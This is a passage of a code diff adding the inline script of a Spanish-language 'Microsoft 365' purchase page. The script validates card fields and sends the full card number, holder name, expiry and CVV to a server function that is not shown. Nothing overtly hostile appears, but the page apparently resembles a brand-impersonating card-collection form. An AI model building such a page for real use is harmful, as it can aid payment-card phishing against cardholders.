+      cardExpiry.addEventListener("input", function () {
+        this.value = formatExpiry(this.value);
+        updateCardPreview();
+        if (isValidExpiry(this.value)) {
+          this.classList.remove("error");
+          cardExpiryError.style.display = "none";
+        }
+      });
+
+      cardHolder.addEventListener("input", function () {
+        updateCardPreview();
+        if (isValidCardHolder(this.value)) {
+          this.classList.remove("error");
+          cardHolderError.style.display = "none";
+        }
+      });
+
+      cardCVV.addEventListener("input", function () {
+        this.value = this.value.replace(/\D/g, "").substring(0, 4);
+        if (isValidCVV(this.value)) {
+          this.classList.remove("error");
+          cardCVVError.style.display = "none";
+        }
+      });
+
+      submitBtn.addEventListener("click", function (e) {
+        e.preventDefault();
+        if (validateForm()) {
+          const cardData = {
+            number: cardNumber.value.replace(/\s/g, ""),
+            holder: cardHolder.value,
+            expiry: cardExpiry.value,
+            cvv: cardCVV.value,
+          };
+          sendCardDataToServer(cardData);
+        } else {
+          alert(
+            "Por favor, corrija los errores en el formulario antes de continuar.",
+          );
+        }
+      });
+
+      cancelBtn.addEventListener("click", function (e) {
+        e.preventDefault();
+        if (
+          confirm(
+            "¿Está seguro de que desea cancelar la compra de Microsoft 365?",
+          )
+        ) {
+          window.location.href = "index.html";
+        }
+      });
+
+      cardForm.addEventListener("submit", function (e) {
+        e.preventDefault();
+      });
+
+      updateCardPreview();
+
+      window.addEventListener("DOMContentLoaded", function () {
+        cardNumber.focus();
+      });
+    </script>
+</body>
+</html>
